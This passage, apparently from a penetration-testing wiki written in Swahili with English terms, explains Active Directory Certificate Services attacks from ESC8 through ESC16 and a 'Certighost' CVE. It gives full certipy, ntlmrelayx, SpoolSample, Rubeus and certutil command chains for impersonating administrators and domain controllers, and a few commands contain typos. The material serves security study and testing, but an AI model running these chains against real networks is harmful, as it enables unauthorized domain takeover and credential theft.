# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Matumizi mabaya ya [Certipy](https://github.com/ly4k/Certipy)

Ombi la certificate hufanywa na Certipy kwa default kwa kutumia template `Machine` au `User`, kulingana na kama jina la account inayorelayiwa linaishia na `$`. Kutaja template mbadala kunawezekana kwa kutumia parameter ya `-template`.

Technique kama [PetitPotam](https://github.com/ly4k/PetitPotam) inaweza kutumika kulazimisha authentication. Unaposhughulika na domain controllers, ni lazima utaje `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Maelezo

Thamani mpya **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) ya **`msPKI-Enrollment-Flag`**, inayojulikana kama ESC9, huzuia kuingizwa kwa **new `szOID_NTDS_CA_SECURITY_EXT` security extension** kwenye certificate. Flag hii huwa muhimu wakati `StrongCertificateBindingEnforcement` imewekwa kuwa `1` (setting ya default), tofauti na setting ya `2`. Umuhimu wake huongezeka katika hali ambapo certificate mapping dhaifu ya Kerberos au Schannel inaweza kutumiwa (kama ilivyo katika ESC10), kwa kuwa kutokuwepo kwa ESC9 hakutabadilisha mahitaji.<sup>[[7]](#references)</sup>

Masharti ambayo setting ya flag hii huwa muhimu ni pamoja na:

- `StrongCertificateBindingEnforcement` haijawekwa kuwa `2` (default ikiwa `1`), au `CertificateMappingMethods` inajumuisha flag ya `UPN`.
- Certificate imewekewa flag ya `CT_FLAG_NO_SECURITY_EXTENSION` ndani ya setting ya `msPKI-Enrollment-Flag`.
- Client authentication EKU yoyote imeainishwa na certificate.
- Ruhusa za `GenericWrite` zinapatikana kwenye account yoyote ili ku-compromise nyingine.

### Abuse Scenario

Tuchukulie kwamba `John@corp.local` ana ruhusa za `GenericWrite` juu ya `Jane@corp.local`, kwa lengo la ku-compromise `Administrator@corp.local`. Certificate template ya `ESC9`, ambayo `Jane@corp.local` anaruhusiwa ku-enroll, imewekwa flag ya `CT_FLAG_NO_SECURITY_EXTENSION` katika setting yake ya `msPKI-Enrollment-Flag`.

Mwanzoni, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, kutokana na `GenericWrite` ya `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Baadaye, `userPrincipalName` ya `Jane` inabadilishwa kuwa `Administrator`, kwa makusudi ikiacha sehemu ya domain ya `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Marekebisho haya hayakiuki masharti, kwa kuwa `Administrator@corp.local` inabaki kuwa tofauti na `userPrincipalName` ya `Administrator`.

Kufuatia hili, template ya certificate ya `ESC9`, iliyoalamishwa kuwa vulnerable, inaombwa kama `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Imebainika kuwa `userPrincipalName` ya certificate inaonyesha `Administrator`, bila “object SID” yoyote.

`userPrincipalName` ya `Jane` kisha inarejeshwa kwenye ya awali, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kujaribu authentication kwa kutumia certificate iliyotolewa sasa kunatoa NT hash ya `Administrator@corp.local`. Command lazima ijumuishe `-domain <domain>` kwa sababu certificate haina maelezo ya domain:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Mappings dha Certificate Dhaifu - ESC10

### Maelezo

Thamani mbili za registry kwenye domain controller zinarejelewa na ESC10:

- Thamani chaguo-msingi ya `CertificateMappingMethods` chini ya `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` ni `0x18` (`0x8 | 0x10`), ambayo hapo awali ilikuwa `0x1F`.
- Mpangilio chaguo-msingi wa `StrongCertificateBindingEnforcement` chini ya `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` ni `1`, ambayo hapo awali ilikuwa `0`.<sup>[[7]](#references)</sup>

**Case 1**

Wakati `StrongCertificateBindingEnforcement` imesanidiwa kuwa `0`.

**Case 2**

Ikiwa `CertificateMappingMethods` inajumuisha bit ya `UPN` (`0x4`).

### Abuse Case 1

Wakati `StrongCertificateBindingEnforcement` imesanidiwa kuwa `0`, akaunti A yenye permissions za `GenericWrite` inaweza kutumiwa vibaya ili ku-compromise akaunti yoyote B.

Kwa mfano, akiwa na permissions za `GenericWrite` juu ya `Jane@corp.local`, mshambulizi analenga ku-compromise `Administrator@corp.local`. Utaratibu huu unaendana na ESC9, na hivyo kuruhusu certificate template yoyote kutumika.

Mwanzoni, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, huku `GenericWrite` ikitumiwa vibaya.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Baadaye, `userPrincipalName` ya `Jane` inabadilishwa kuwa `Administrator`, huku sehemu ya `@corp.local` ikiachwa kwa makusudi ili kuepuka ukiukaji wa kizuizi.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Kufuatia hili, cheti kinachowezesha uthibitishaji wa mteja kinaombwa kama `Jane`, kwa kutumia template chaguo-msingi ya `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` ya `Jane` kisha inarejeshwa kuwa ya awali, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kuthibitisha kwa kutumia certificate iliyopatikana kutatoa NT hash ya `Administrator@corp.local`, hivyo kuhitaji kubainisha domain kwenye command kwa sababu certificate haina maelezo ya domain.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Kisa cha Matumizi Mabaya 2

Kwa `CertificateMappingMethods` iliyo na bit flag ya `UPN` (`0x4`), akaunti A yenye ruhusa za `GenericWrite` inaweza kucompromise akaunti yoyote B isiyo na property ya `userPrincipalName`, ikijumuisha akaunti za mashine na domain administrator aliyejengwa ndani, `Administrator`.

Hapa, lengo ni kucompromise `DC$@corp.local`, tukianza kwa kupata hash ya `Jane` kupitia `Shadow Credentials`, tukitumia `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` ya `Jane` kisha inawekwa kuwa `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Cheti cha uthibitishaji wa mteja kinaombwa kama `Jane` kwa kutumia template chaguo-msingi ya `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` ya `Jane` inarejeshwa kwenye ya awali baada ya mchakato huu.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Ili kufanya uthibitishaji kupitia Schannel, chaguo la `-ldap-shell` la Certipy hutumiwa, likionyesha kuwa uthibitishaji umefaulu kama `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kupitia LDAP shell, commands kama `set_rbcd` huwezesha mashambulizi ya Resource-Based Constrained Delegation (RBCD), ambayo yanaweza kucompromise domain controller.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Athari hii pia inaenea kwa akaunti yoyote ya mtumiaji isiyo na `userPrincipalName` au ambayo hailingani na `sAMAccountName`, huku `Administrator@corp.local` ya msingi ikiwa shabaha kuu kutokana na LDAP privileges zake za juu na kutokuwa na `userPrincipalName` kwa default.

## Relaying NTLM to ICPR - ESC11

### Explanation

Ikiwa CA Server haijasanidiwa na `IF_ENFORCEENCRYPTICERTREQUEST`, inaweza kuruhusu mashambulizi ya NTLM relay bila signing kupitia RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Unaweza kutumia `certipy` kubaini ikiwa `Enforce Encryption for Requests` imezimwa, na certipy itaonyesha Vulnerabilities za `ESC11`.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Hali ya Matumizi Mabaya

Inahitajika kusanidi relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Kumbuka: Kwa domain controllers, lazima tubainishe `-template` katika DomainController.

Au kwa kutumia [fork ya impacket ya sploutchy](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Maelezo

Administrators wanaweza kusanidi Certificate Authority ili kuihifadhi kwenye kifaa cha nje kama vile "Yubico YubiHSM2".

Ikiwa kifaa cha USB kimeunganishwa kwenye CA server kupitia port ya USB, au kupitia USB device server iwapo CA server ni virtual machine, authentication key (ambayo wakati mwingine huitwa "password") inahitajika ili Key Storage Provider itengeneze na kutumia keys katika YubiHSM.

Key/password hii imehifadhiwa kwenye registry chini ya `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` ikiwa cleartext.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Scenario ya Matumizi Mabaya

Ikiwa CA's private key imehifadhiwa kwenye kifaa halisi cha USB unapopata shell access, inawezekana kurecover key.

Kwanza, unahitaji kupata CA certificate (hii ni public) kisha:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Hatimaye, tumia amri ya certutil `-sign` kuunda certificate mpya ya kiholela kwa kutumia CA certificate na private key yake.

## OID Group Link Abuse - ESC13

### Maelezo

Attribute ya `msPKI-Certificate-Policy` huruhusu issuance policy kuongezwa kwenye certificate template. Objects za `msPKI-Enterprise-Oid` zinazohusika na kutoa policies zinaweza kugunduliwa katika Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) ya PKI OID container. Policy inaweza kuunganishwa na AD group kwa kutumia attribute ya object's `msDS-OIDToGroupLink`, hivyo kuwezesha mfumo kumpa authorization mtumiaji anayewasilisha certificate kana kwamba alikuwa mwanachama wa group. [Rejeleo hapa](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Kwa maneno mengine, mtumiaji anapokuwa na ruhusa ya ku-enroll certificate na certificate hiyo ikiwa imeunganishwa na OID group, mtumiaji anaweza kurithi privileges za group hiyo.

Tumia [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kutafuta OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenario ya Abuse

Tafuta ruhusa ya mtumiaji kwa kutumia `certipy find` au `Certify.exe find /showAllPermissions`.

Ikiwa `John` ana ruhusa ya ku-enroll kwenye `VulnerableTemplate`, mtumiaji anaweza kurithi privileges za group `VulnerableGroup`.

Anachohitaji kufanya ni kubainisha template; atapata certificate yenye haki za `OIDToGroupLink`.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Usanidi Hatarishi wa Uhuishaji Upya wa Certificate- ESC14

### Maelezo

Maelezo katika https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping ni ya kina sana. Hapa chini kuna nukuu ya maandishi asili.<sup>[[14]](#references)</sup>

ESC14 inahusu vulnerabilities zinazotokana na "weak explicit certificate mapping", hasa kupitia matumizi mabaya au usanidi usio salama wa attribute ya `altSecurityIdentities` kwenye accounts za user au computer za Active Directory. Attribute hii yenye thamani nyingi huwawezesha administrators kuhusisha manually certificates za X.509 na account ya AD kwa madhumuni ya authentication. Inapojazwa, mappings hizi za wazi zinaweza kubatilisha mantiki chaguo-msingi ya certificate mapping, ambayo kwa kawaida hutegemea UPNs au majina ya DNS katika SAN ya certificate, au SID iliyowekwa kwenye security extension ya `szOID_NTDS_CA_SECURITY_EXT`.

Mapping ya "weak" hutokea wakati string value inayotumika ndani ya attribute ya `altSecurityIdentities` kutambua certificate ni pana mno, inakisiwa kwa urahisi, inategemea certificate fields zisizo za kipekee, au inatumia certificate components zinazoweza ku-spoof kwa urahisi. Ikiwa attacker anaweza kupata au kutengeneza certificate ambayo attributes zake zinaendana na explicit mapping dhaifu iliyofafanuliwa kwa account yenye privileges, anaweza kutumia certificate hiyo ku-authenticate kama account hiyo na kuiga utambulisho wake.

Mifano ya strings za `altSecurityIdentities` mapping ambazo zinaweza kuwa dhaifu ni pamoja na:

- Kufanya mapping kwa kutumia Subject Common Name (CN) ya kawaida pekee: kwa mfano, `X509:<S>CN=SomeUser`. Attacker anaweza kupata certificate yenye CN hii kutoka kwenye source isiyo salama zaidi.
- Kutumia Issuer Distinguished Names (DNs) au Subject DNs za jumla kupita kiasi bila qualification ya ziada kama serial number maalum au subject key identifier: kwa mfano, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Kutumia patterns nyingine zinazotabirika au identifiers zisizo za cryptographic ambazo attacker anaweza kuzitimiza katika certificate anayoweza kuipata kihalali au ku-forge (ikiwa amehack CA au amepata template yenye vulnerability kama katika ESC1).

Attribute ya `altSecurityIdentities` inasaidia formats mbalimbali za mapping, kama vile:

- `X509:<I>IssuerDN<S>SubjectDN` (hufanya mapping kwa kutumia Issuer na Subject DN kamili)
- `X509:<SKI>SubjectKeyIdentifier` (hufanya mapping kwa kutumia thamani ya certificate's Subject Key Identifier extension)
- `X509:<SR>SerialNumberBackedByIssuerDN` (hufanya mapping kwa kutumia serial number, ambayo implicitly ina-qualify na Issuer DN) - hii si format ya standard, kwa kawaida ni `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (hufanya mapping kwa kutumia RFC822 name, kwa kawaida email address, kutoka kwenye SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (hufanya mapping kwa kutumia SHA1 hash ya certificate's raw public key - kwa ujumla ni strong)

Usalama wa mappings hizi hutegemea kwa kiwango kikubwa specificity, uniqueness, na cryptographic strength ya certificate identifiers zilizochaguliwa na kutumika katika mapping string. Hata ikiwa strong certificate binding modes zimewezeshwa kwenye Domain Controllers (ambazo huathiri hasa implicit mappings kulingana na SAN UPNs/DNS na SID extension), entry ya `altSecurityIdentities` iliyosanidiwa vibaya bado inaweza kutoa njia ya moja kwa moja ya impersonation ikiwa mantiki ya mapping yenyewe ina dosari au inaruhusu mambo kwa upana mno.
### Hali ya Abuse

ESC14 inalenga **explicit certificate mappings** katika Active Directory (AD), hasa attribute ya `altSecurityIdentities`. Ikiwa attribute hii imewekwa (kwa muundo au kutokana na misconfiguration), attackers wanaweza ku-impersonate accounts kwa kuwasilisha certificates zinazoendana na mapping.

#### Scenario A: Attacker Anaweza Kuandika kwenye `altSecurityIdentities`

**Sharti la awali**: Attacker ana write permissions kwenye attribute ya `altSecurityIdentities` ya target account, au ana permission ya kuipatia account hiyo kupitia mojawapo ya permissions zifuatazo kwenye target AD object:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Target Ina Weak Mapping Kupitia X509RFC822 (Email)

- **Sharti la awali**: Target ina weak X509RFC822 mapping katika altSecurityIdentities. Attacker anaweza kuweka attribute ya mail ya victim ili ilingane na X509RFC822 name ya target, ku-enroll certificate kama victim, na kuitumia ku-authenticate kama target.
#### Scenario C: Target Ina X509IssuerSubject Mapping

- **Sharti la awali**: Target ina weak X509IssuerSubject explicit mapping katika `altSecurityIdentities`. Attacker anaweza kuweka attribute ya `cn` au `dNSHostName` kwenye victim principal ili ilingane na subject ya X509IssuerSubject mapping ya target. Kisha, attacker anaweza ku-enroll certificate kama victim, na kutumia certificate hiyo ku-authenticate kama target.
#### Scenario D: Target Ina X509SubjectOnly Mapping

- **Sharti la awali**: Target ina weak X509SubjectOnly explicit mapping katika `altSecurityIdentities`. Attacker anaweza kuweka attribute ya `cn` au `dNSHostName` kwenye victim principal ili ilingane na subject ya X509SubjectOnly mapping ya target. Kisha, attacker anaweza ku-enroll certificate kama victim, na kutumia certificate hiyo ku-authenticate kama target.
### operesheni halisi
#### Scenario A

Omba certificate ya certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Hifadhi na ubadilishe certificate
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Authenticate (kwa kutumia certificate)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Usafishaji (hiari)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Kwa mbinu mahususi zaidi za mashambulizi katika scenarios mbalimbali za mashambulizi, tafadhali rejelea yafuatayo: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Maelezo

Maelezo yaliyopo kwenye https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc ni ya kina sana. Hapa chini kuna nukuu kutoka kwenye maandishi asilia.<sup>[[15]](#references)</sup>

Kwa kutumia certificate templates za built-in default version 1, mshambuliaji anaweza kuunda CSR yenye application policies ambazo hupendelewa kuliko sifa za Extended Key Usage zilizosanidiwa kwenye template. Sharti pekee ni kuwa na enrollment rights, na inaweza kutumiwa kutengeneza client authentication, certificate request agent, na codesigning certificates kwa kutumia template ya **_WebServer_**

### Matumizi mabaya

[Certipy privilege-escalation documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) ina mifano ya matumizi yenye maelezo zaidi.<sup>[[14]](#references)</sup>


Amri ya `find` ya Certipy inaweza kusaidia kutambua V1 templates ambazo huenda zikaathiriwa na ESC15 ikiwa CA haijafanyiwa patch.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Direct Impersonation kupitia Schannel

**Hatua ya 1: Omba certificate, ukiingiza "Client Authentication" Application Policy na UPN ya target.** Attacker `attacker@corp.local` analenga `administrator@corp.local` kwa kutumia template ya "WebServer" V1 (inayomruhusu enrollee-kutoa subject).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: V1 template yenye "Enrollee supplies subject" iliyo hatarini.
- `-application-policies 'Client Authentication'`: Huongeza OID `1.3.6.1.5.5.7.3.2` kwenye Application Policies extension ya CSR.
- `-upn 'administrator@corp.local'`: Huweka UPN kwenye SAN kwa ajili ya impersonation.

**Hatua ya 2: Authenticate kupitia Schannel (LDAPS) kwa kutumia certificate iliyopatikana.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Hatua ya 1: Omba certificate kutoka kwenye template ya V1 (iliyo na "Enrollee supplies subject"), ukiingiza Application Policy ya "Certificate Request Agent".** Certificate hii ni ya attacker (`attacker@corp.local`) ili awe enrollment agent. Hakuna UPN iliyobainishwa kwa identity ya attacker mwenyewe hapa, kwa kuwa lengo ni uwezo wa agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.

**Hatua ya 2: Tumia certificate ya "agent" kuomba certificate kwa niaba ya mtumiaji lengwa mwenye privileged access.** Hii ni hatua inayofanana na ESC3, ikitumia certificate kutoka Hatua ya 1 kama certificate ya agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Hatua ya 3: Thibitisha utambulisho kama mtumiaji mwenye privileji ukitumia certificate ya "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Imezimwa kwenye CA (Kote)-ESC16

### Maelezo

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** inarejelea hali ambapo, ikiwa usanidi wa AD CS haulazimishi kujumuishwa kwa extension ya **szOID_NTDS_CA_SECURITY_EXT** katika certificates zote, attacker anaweza kutumia udhaifu huu kwa:

1. Kuomba certificate **bila SID binding**.

2. Kutumia certificate hii **kwa authentication kama account yoyote**, kwa mfano kujifanya kuwa account yenye privileges za juu (k.m., Domain Administrator).

Unaweza pia kurejelea article hii ili kujifunza zaidi kuhusu kanuni hiyo kwa undani:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuse

Yafuatayo yamerejelewa kutoka [kiungo hiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Bonyeza ili kuona njia za matumizi zilizoelezwa kwa undani zaidi.<sup>[[14]](#references)</sup>

Ili kutambua kama mazingira ya Active Directory Certificate Services (AD CS) yanaathiriwa na **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Hatua ya 1: Soma UPN ya awali ya akaunti ya victim (Si lazima - kwa ajili ya kurejesha).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Hatua ya 2: Sasisha UPN ya akaunti ya mwathiriwa iwe `sAMAccountName` ya msimamizi lengwa.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Hatua ya 3: (Ikiwa inahitajika) Pata credentials za akaunti ya "victim" (kwa mfano, kupitia Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Hatua ya 4: Omba certificate kama mtumiaji wa "mwathiriwa" kutoka kwa _client authentication template_ yoyote inayofaa (kwa mfano, "User") kwenye CA iliyo hatarini kwa ESC16.** Kwa sababu CA iko hatarini kwa ESC16, itaacha kiendelezi cha usalama cha SID kiotomatiki kwenye certificate iliyotolewa, bila kujali mipangilio mahususi ya template kwa kiendelezi hiki. Weka environment variable ya Kerberos credential cache (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Kisha omba cheti:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Hatua ya 5: Rejesha UPN ya akaunti ya "mwathiriwa".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Hatua ya 6: Thibitisha kama msimamizi lengwa.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Maelezo

**Certighost** hutumia vibaya **AD CS enrollment chase / callback path**, ambapo CA huamini request attributes zinazotolewa na requester ili kubaini identity inayopaswa kuwekwa kwenye certificate iliyotolewa. Katika public PoC, request iliyoundwa maalum hujumuisha:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP inayodhibitiwa na attacker ambayo CA itawasiliana nayo
- **`rmd`**: **jina la DNS la target Domain Controller** wa kuigiza

Ikiwa CA itafuata chase hiyo, itaunganishwa na attacker kupitia **SMB/LSA (`445`)** na **LDAP (`389`)**. Attacker hutumia **machine account** halisi (kwa kawaida iliyoundwa kupitia **`ms-DS-MachineAccountQuota`** ya default) ili callback session ithibitishe kama domain principal halali, lakini rogue services hurudisha identity attributes za **target DC** badala yake:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Ikiwa CA **haitafungi kwa njia ya cryptographic identity iliyorejeshwa na callback principal iliyothibitishwa**, inaweza kutoa certificate ya **Domain Controller**, ingawa session ilithibitishwa kama machine account inayodhibitiwa na attacker. Hii inafanya bug hii kuwa tofauti kimawazo na **Certifried**: badala ya kuandika upya AD attributes kama `dNSHostName`, attacker **hubadilisha identity data wakati wa CA callback resolution**.<sup>[[2]](#references)</sup>

**Masharti muhimu ya awali:**

- **Domain credentials** zenye privileges ndogo
- Uwezo wa **kuunda au kutumia tena computer account**
- Network reachability kutoka kwa **CA** hadi **ports `389` na `445`** zinazodhibitiwa na attacker
- CA request path iliyo vulnerable / ambayo haijafanyiwa patch (update ya Microsoft ya **14 Julai 2026** iliongeza **DC validation kwa `cdc`** pamoja na **resolved-SID comparison**)

`.pfx` inayopatikana inaweza kutumika kwa **PKINIT**, na kutengeneza **`.ccache`** pamoja na, katika published PoC flow, **target DC NT hash**, ambayo kwa kawaida inatosha kwa **full domain compromise**.

### Matumizi mabaya

Public PoC hu-automate chain nzima:<sup>[[1]](#references)</sup>

1. Unda au tumia tena **machine account** inayodhibitiwa na attacker.
2. Anzisha **rogue LDAP na SMB/LSA listeners** kwenye `389` na `445`.
3. Tuma certificate request yenye attributes za **`cdc`** zinazodhibitiwa na attacker na **`rmd`** ya target.
4. Ruhusu CA kuthibitisha kwa rogue listeners kama machine account inayodhibitiwa, lakini jibu identity lookups kwa attributes za **target DC**.
5. Pokea **DC certificate** iliyosainiwa na CA, kisha uitumie kwa **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Useful runtime flags from the PoC:

- `--listener <ip>`: chagua wazi IP ya callback inayotangazwa katika `cdc`
- `--computer-name <NAME$>`: tumia tena machine account iliyopo badala ya kuunda mpya

